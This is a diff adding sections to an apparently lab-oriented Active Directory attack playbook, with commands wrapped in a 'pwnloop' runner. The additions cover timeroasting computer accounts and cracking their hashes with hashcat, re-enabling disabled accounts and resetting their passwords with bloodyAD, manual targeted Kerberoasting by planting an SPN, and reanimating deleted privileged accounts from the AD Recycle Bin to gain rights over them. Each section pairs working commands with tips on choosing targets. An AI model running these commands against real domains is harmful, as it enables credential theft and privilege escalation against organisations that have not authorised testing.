@@ -84,6 +84,33 @@ pwnloop x "john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/l
 Accounts with "do not require Kerberos preauthentication" hand you a crackable
 hash for free.
 
+## Timeroasting (computer accounts, no creds needed, just reachable SMB/NTP)
+
+A pre-auth roast of *machine* accounts, orthogonal to AS-REP/Kerberoast: the DC
+signs MS-SNTP (authenticated NTP) replies with a MAC derived from a computer
+account's password, and it will do so for any RID with **no authentication**.
+So every computer account is "timeroastable" — the only question is whether its
+password is crackable. Auto-generated machine passwords are not; a **manually
+set** one usually is.
+
+```bash
+pwnloop x "nxc smb $T -M timeroast"            # dumps RID:$sntp-ms$... per computer
+pwnloop x "hashcat -m 31300 it3.hash /usr/share/wordlists/rockyou.txt -O --username"
+```
+
+The `--username` flag is mandatory — the module emits `RID:$sntp-ms$...` and
+hashcat 31300 wants only the `$sntp-ms$...` token (a bare hash throws "token
+length exception").
+
+**How to pick the target before cracking anything:** compare each computer's
+`pwdLastSet` against `whenCreated`. A machine normally sets its password at
+creation and rolls it every 30 days, so `pwdLastSet ≈ whenCreated` means
+auto-generated (don't bother). A `pwdLastSet` sitting *hours or days after*
+`whenCreated` means a human typed it — that is the one to crack, and it is often
+the intended foothold on a locked-down DC where no user has an exploitable ACL.
+A cracked machine password is a full credential: `getTGT 'dom/NAME$:pw'`, then
+use whatever that computer object can do (group `AddSelf`, RBCD, LAPS read…).
+
 ## With any domain credential
 
 ```bash
@@ -181,6 +208,15 @@ token-freeze and the lab reset job):
 | `WriteDacl`/`GenericAll` on **domain** | grant yourself DCSync | `dacledit -rights DCSync` |
 | `WriteAccountRestrictions` | write RBCD attr on the object | as computer edge above |
 
+**A disabled target is not a dead edge.** When your control edge lands on an
+account BloodHound shows as disabled, check what the account *is* before
+discarding it — a disabled member of `Remote Management Users`/`Backup Operators`
+etc. is a login waiting to be switched on. With `GenericAll`/`GenericWrite` you
+own `userAccountControl`, so clear the flag and reset the password in one pass:
+`bloodyAD ... remove uac <user> -f ACCOUNTDISABLE` then `set password`. (Undo on
+cleanup with `add uac <user> -f ACCOUNTDISABLE`; the original password cannot be
+restored, so note that in the ledger.)
+
 ```bash
 pwnloop x "net rpc password 'target-user' 'NewPass123!' -U 'machine.htb'/'you'%'yourpass' -S $T"
 pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> set password <target> 'New1!'"
@@ -219,7 +255,40 @@ pwnloop x "certipy shadow auto -u <u>@<dom> -p <p> -account <target>"   # → NT
 one, roast, remove it:
 ```bash
 pwnloop x "python3 targetedKerberoast.py -v -d <dom> -u <u> -p <p> --request-user <target>"
+# Manual fallback when targetedKerberoast.py isn't installed (it often isn't):
+pwnloop x "bloodyAD --host $T -d <dom> -u <u> -p <p> set object <target> servicePrincipalName -v 'HTTP/x'"
+pwnloop x "faketime \"\$(date -u -d '+<skew>' '+%F %T')\" impacket-GetUserSPNs -request-user <target> -dc-ip $T <dom>/<u>:<p>"
+# clearing the SPN again: bloodyAD's set -v '' errors (invalidAttributeSyntax); clear it as
+# admin later with PowerShell  Set-ADUser <target> -ServicePrincipalNames @{Remove='HTTP/x'}
 ```
+
+## Deleted-object reanimation (AD Recycle Bin)
+
+An empty OU that you have `GenericAll`/`WriteDacl` over is not a dead end — control
+of an OU extends *by inheritance* to any object restored into it, and the AD Recycle
+Bin often holds a deleted privileged account whose `lastKnownParent` is that OU.
+Reanimate it and your OU rights now apply to a live account. The name of a box that
+ships this (a "tomb", a "watcher", a "graveyard" OU) is the tell.
+
+```bash
+# enumerate tombstones — needs the show-deleted control (1.2.840.113556.1.4.417)
+pwnloop x "ldapsearch -x -H ldap://$T -D '<u>@<dom>' -w '<p>' \
+  -b 'CN=Deleted Objects,DC=<dc>' -E '!1.2.840.113556.1.4.417' \
+  '(objectClass=user)' sAMAccountName objectSid objectGUID lastKnownParent"
+# restore it (needs the AD module → run over WinRM on the DC, or use bloodyAD)
+pwnloop x "nxc winrm $T -u <u> -p <p> -X 'Restore-ADObject -Identity <objectGUID>'"
+```
+
+**Pick the tombstone by SID, not by name.** Multiple deletions of the same account
+leave several tombstones with the *same* sAMAccountName but *different* objectSids.
+Any ACE that grants the account its interesting right (a template `Enroll`, a group
+membership) names a specific **SID** — reanimation preserves objectSid, so only the
+tombstone whose SID matches that ACE is useful. Decode every tombstone's `objectSid`
+(last subauthority = RID) and restore the one the target ACE references; restoring
+the wrong one wastes a cycle, and you must re-delete it first (`Remove-ADObject`)
+before the right one will restore, because the sAMAccountName collides. Reanimation
+does **not** restore group memberships (they live on the group's `member` attr) — but
+it *does* preserve any ACE that named the account's SID on another object.
 
 ## AD-integrated DNS (ADIDNS) — any authenticated user can define a name
 
